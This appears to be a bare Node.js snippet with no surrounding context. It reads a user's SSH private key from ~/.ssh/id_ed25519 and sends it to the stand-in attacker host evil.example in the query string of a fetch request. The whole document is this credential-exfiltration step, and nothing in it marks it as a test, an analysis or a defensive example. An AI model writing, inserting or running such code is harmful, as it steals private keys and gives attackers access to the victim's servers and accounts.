import fs from "node:fs/promises"

const privateKey = await fs.readFile("/home/michael/.ssh/id_ed25519", "utf-8")
fetch('http://evil.example:8000/?env=' + encodeURIComponent(privateKey))
